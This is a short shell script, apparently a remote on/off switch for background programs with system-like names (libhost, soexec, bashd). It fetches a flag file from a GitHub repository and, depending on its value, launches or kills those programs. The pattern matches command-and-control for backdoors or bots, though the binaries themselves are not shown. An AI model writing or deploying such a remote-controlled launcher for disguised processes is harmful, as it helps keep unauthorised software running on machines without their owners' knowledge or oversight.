#! /bin/sh

wget https://raw.githubusercontent.com/myvulweb/singal/master/1.txt -O /tmp/singal-test.txt
ret=`cat /tmp/singal-test.txt`

echo $ret
dest='1'
if [ "$ret" = "$dest" ]
then
	echo "start"
	if [ `ps -ef|grep /usr/bin/libhost | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started libhost"
	else
		echo "need to start libhost"
		/usr/bin/libhost &
	fi

	if [ `ps -ef|grep /usr/bin/soexec | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started soexec"
	else
		echo "need to start soexec"
		/usr/bin/soexec &
	fi

else
	echo "need to stop all"
	killall libhost
	killall soexec
	killall bashd
fi